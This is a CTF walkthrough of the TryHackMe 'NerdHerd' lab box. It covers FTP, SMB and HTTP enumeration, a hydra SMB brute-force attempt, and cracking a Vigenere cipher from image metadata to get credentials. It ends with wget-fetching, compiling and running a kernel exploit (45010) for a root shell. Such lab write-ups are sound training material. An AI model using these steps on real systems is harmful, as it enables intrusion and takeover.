# NerdHead

## Introduction

Welcome to my another writeup! In this TryHackMe [NerdHead](https://tryhackme.com/room/nerdherd) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Hack your way into this easy/medium level legendary TV series "Chuck" themed box!

> Difficulty: Medium

```
Hack this machine before nerd herd fellas arrive, happy hacking!!!
```

- Overall difficulty for me: Easy
    - Initial foothold: Easy
    - Privilege escalation: Very easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# export RHOSTS=10.10.115.60 
                                                                                                 
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.61.134
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYrqlEH/5dR4LGfKThK3BQuCVPxx91asS9FfOewAooNFJf4zsESd/VCHcfQCXEHucZo7+xdceZklC7PwhzmybjkN79iQcd040gw5kg0htMWuVzdzcVFowV0hC1o7Rbze7zLya1B1C105aEoRKVHVeTx0ishoJfJlkJBlx2nKrKWciDYbJQvG+1TxEJaEM4KkmkO31y0L7C3nsdaEd+Z/lNIo6JfbxwrOb6vBonPLS/lZDJdaY0vrdZJ81FRiMbSuUIj3lEtDAZNWBTwXx5kO3fwodw4KbS0ukW5srZX5TLmf/Q/T8ooCnJMLvaksIXKl0r8fjJIx0QucoCwhCTR2o1
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNSB3jALoSxl/A6Jtpf21NoRfbr8ICR6FpH+bbprQ17LUFUm6pUrhDSx134JBYKLOfFljhNKR57LLS6LAK0bKB0=
|   256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII4VHJRelvecImJNkkZcKdI+vK0Hn1SjMT2r8SaiLiK3
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   NERDHERD<00>         Flags: <unique><active>
|   NERDHERD<03>         Flags: <unique><active>
|   NERDHERD<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-09-15T01:25:44
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44658/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 65101/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 47234/udp): CLEAN (Failed to receive data)
|   Check 4 (port 17775/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2022-09-15T04:25:44+03:00
```

According to `rustscan` result, we have 5 ports are opened:

Open Ports        | Service
------------------|------------------------
21                | vsftpd 3.0.3
22                | OpenSSH 7.2p2 Ubuntu
139,445           | Samba 4.3.11 Ubuntu
1337              | Apache 2.4.18 ((Ubuntu))

## FTP on Port 21

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# ftp $RHOSTS       
Connected to 10.10.115.60.
220 (vsFTPd 3.0.3)
Name (10.10.115.60:nam): anonymous
230 Login successful.
[...]
ftp> 
ftp> ls -lah
229 Entering Extended Passive Mode (|||45508|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
```

Found `pub` directory.

```
ftp> cd pub
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||44620|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
```

**We can recursively download all files via `wget`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# wget -r ftp://anonymous:''@$RHOSTS
```

```
┌──(root🌸siunam)-[~/…/NerdHead/10.10.115.60/pub/.jokesonyou]
└─# cat hellon3rd.txt 
all you need is in the leet
```

Nothing useful in FTP? The "leet" is refer to 1337 in leetspeak. Let's check HTTP on port 1337.

## HTTP on Port 1337

**view-source:http://10.10.115.60:1337/:**
```html
<!--
	hmm, wonder what i hide here?
 -->

<!--
	maybe nothing? :)
 -->

<!--
	keep digging, mister/ma'am
 -->

<body onload="alertFunc()">

<script>
function alertFunc() {
  alert("HACKED by 0xpr0N3rd");
  alert("Just kidding silly.. I left something in here for you to find")
}
</script>

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>

</body>
```

Nice rabbit hole! :D

**Next, why not enumerate hidden directory via `gobuster`?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# gobuster dir -u http://$RHOSTS:1337/ -w /usr/share/wordlists/dirb/common.txt -t 100      
[...]
/admin                (Status: 301) [Size: 319] [--> http://10.10.115.60:1337/admin/]
/index.html           (Status: 200) [Size: 11755]                                    
/server-status        (Status: 403) [Size: 279]
```

Found `/admin/` directory.

**`/admin/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a1.png)

It's a login page. Let's `View-Source` to see any shenanigans:

```
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
```

Found a credentials in base64 encoding! Let's decode that:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# echo "Y2liYXJ0b3dza2k=" | base64 -d                            
cibartowski

┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# echo "aGVoZWdvdTwdasddHlvdQ==" | base64 -d                             
hehegou<j�][�base64: invalid input
```

The second one looks weird.

I tried to login with that credentials, but no luck. Turns out it's a rabbit hole.

## SMB on Port 445

**Enum4linux:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# enum4linux $RHOSTS | tee enum4linux.log
[...]
=================================( Share Enumeration on 10.10.115.60 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	nerdherd_classified Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
[...]

[+] Attempting to map shares on 10.10.115.60

//10.10.115.60/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.115.60/nerdherd_classified	Mapping: DENIED Listing: N/A Writing: N/A
[...]
[+] Enumerating users using SID S-1-5-21-2306820301-2176855359-2727674639 and logon username '', password ''

S-1-5-21-2306820301-2176855359-2727674639-501 NERDHERD\nobody (Local User)
S-1-5-21-2306820301-2176855359-2727674639-513 NERDHERD\None (Domain Group)
S-1-5-21-2306820301-2176855359-2727674639-1000 NERDHERD\chuck (Local User)
[...]
```

- Found SMB shares:
	- nerdherd_classified
- Found username:
	- chuck

**Try to connect to `nerdherd_classified` share:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# smbclient \\\\$RHOSTS\\nerdherd_classified 
Password for [WORKGROUP\nam]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Looks like we need a credentials...

Maybe we can try to brute force SMB?

**I'll do this via `hydra`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# hydra -t 1 -f -l chuck -P /usr/share/wordlists/rockyou.txt $RHOSTS smb
[...]
```

But no luck...

Ok, let's take a step back. I was missing something.

# Initial Foothold

In the `/pub/youfoundme.png` from FTP port, it might has some **metadata** that worth to look at:

**exiftool:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead/10.10.115.60]
└─# exiftool info pub/youfoundme.png 
[...]
Owner Name                      : fijbxslz
```

The `Owner Name` looks weird... Maybe it an encrypted message?

I copy and pasted this encrypted message to [Cipher Identifier and Analyzer](https://www.boxentriq.com/code-breaking/cipher-identifier):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a2.png)

- Analyzed cipher: **Vigenere Cipher**

However, if we need to decrypt a vigenere cipher message, **we need a decryption key.** (From [CyberChef](https://gchq.github.io/CyberChef))

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a3.png)

Hmm... Do you still remember a **YouTube link** in HTTP on port 1337?

```html
<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>
```

And this YouTube video is a song called "**The Trashmen - Surfin Bird**"

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a5.png)

Hmm... **What if the decryption key is inside the lyrics?** :D

The lyrics repeat the word **"`bird is the word`"** a LOT. Let's try this as the decryption key:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a6.png)

Boom!!! We got a credentials!

This got me thinking: **Is this password is for user `chuck` in SMB??**

Let's try that!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# smbclient \\\\$RHOSTS\\nerdherd_classified -U chuck%{Redacted}   
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 10 21:29:53 2020
  ..                                  D        0  Thu Nov  5 15:44:40 2020
  secr3t.txt                          N      125  Thu Sep 10 21:29:53 2020

		8124856 blocks of size 1024. 3414112 blocks available
```

Let's go!! We got him! Let's `get` that `secr3t.txt` file:

```
smb: \> get secr3t.txt
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# cat secr3t.txt               
Ssssh! don't tell this anyone because you deserved it this far:

	check out "/this1sn0tadirect0ry"

Sincerely,
	0xpr0N3rd
<3
```

100% sure this is for HTTP on port 1337!

**/this1sn0tadirect0ry/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/NerdHead/images/a7.png)

A file called `creds.txt`? Let's `wget` that:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# wget http://$RHOSTS:1337/this1sn0tadirect0ry/creds.txt
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# cat creds.txt 
alright, enough with the games.

here, take my ssh creds:
	
	chuck : {Redacted}
```

Nice! We got his password in SSH!

**SSH into `chuck`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# ssh chuck@$RHOSTS                                           
[...]
chuck@nerdherd:~$ whoami;hostname;id;ip a
chuck
nerdherd
uid=1000(chuck) gid=1000(chuck) groups=1000(chuck),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:dc:d9:0b:1e:0d brd ff:ff:ff:ff:ff:ff
    inet 10.10.52.70/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::dc:d9ff:fe0b:1e0d/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `chuck`!

**user.txt:**
```
chuck@nerdherd:~$ cat /home/chuck/user.txt 
THM{Redacted}
```

# Privilege Escalation

## chuck to root

**Home directory of user `chuck`:**
```
chuck@nerdherd:~$ ls -lah
[...]
-rw-------  1 chuck chuck  742 Kas  5  2020 .bash_history
[...]
```

Let's look at `.bash_history`:

```bash
chuck@nerdherd:~$ cat .bash_history 

exit
su
exit
su
exit
ifconfig 
clear
ftp localhost
clear
cd /Desk
cd /home/chuck/Desktop/
clear
ftp localhost
service restart ftp
service ftpd restart
why are you looking at my logs????
su 
clear
ftp localhost
restart
reboot
```

Nothing useful.

**Kernel version:**
```
chuck@nerdherd:~$ uname -a;cat /etc/issue
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 16.04.1 LTS \n \l
```

This kernel version looks like is **vulnerable to kernel exploit**?

After some googling about `Linux kernel 4.4.0-31 exploit`, I found several kernel exploits that work for us.

Instead of using the infamous dirtycow kernel exploits, I'll use another kernel exploit:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# searchsploit 45010
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c
---------------------------------------------------------------------------------- ---------------------------------

┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# searchsploit -m 45010
```

**To exploit it, I'll:**

- Check the target machine has `gcc` installed or not:

```
chuck@nerdherd:/tmp$ which gcc
/usr/bin/gcc
```

It has `gcc`! Then I'll compile the exploit from there.

- Transfer the `C` exploit to the target machine, compile it via `gcc`, and run the compiled exploit binary:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/NerdHead]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
chuck@nerdherd:/tmp$ wget http://10.18.61.134/45010.c

chuck@nerdherd:/tmp$ gcc 45010.c -o 45010
chuck@nerdherd:/tmp$ ./45010 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88000f262f00
[*] Leaking sock struct from ffff88000e517800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880019e78f00
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880019e78f00
[*] credentials patched, launching shell...
# whoami;hostname;id;ip a
root
nerdherd
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(chuck)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:dc:d9:0b:1e:0d brd ff:ff:ff:ff:ff:ff
    inet 10.10.52.70/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::dc:d9ff:fe0b:1e0d/64 scope link 
       valid_lft forever preferred_lft forever
```

And I'm root! :D

# Rooted

**root.txt:**
```
# cat /root/root.txt
cmon, wouldnt it be too easy if i place the root flag here?
```

Hmm... Let's `find` where the root flag lives.

**.root.txt:**
```
# find / -type f -name "*root.txt*" 2>/dev/null
/root/root.txt
/opt/.root.txt

# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{Redacted}
```

**Bonus Flag:**

By looking at the root's `.bash_history`, it has the size of 3.1K, which should contain lots of history:

```
# ls -lah /root/.bash_history
-rw-r--r-- 1 root root 3,1K Kas  5  2020 /root/.bash_history
```

```
# cat /root/.bash_history
[...]
cp youfoundme.png /home/chuck/Desktop/
ls -la
rm youfoundme.png 
THM{Redacted}
```

Found it! :D

# Conclusion

What we've learned:

1. FTP Enumeration
2. Directory Enumeration
3. SMB Enumeration
4. Vigenere Cipher
5. Privilege Escalation via Kernel Exploit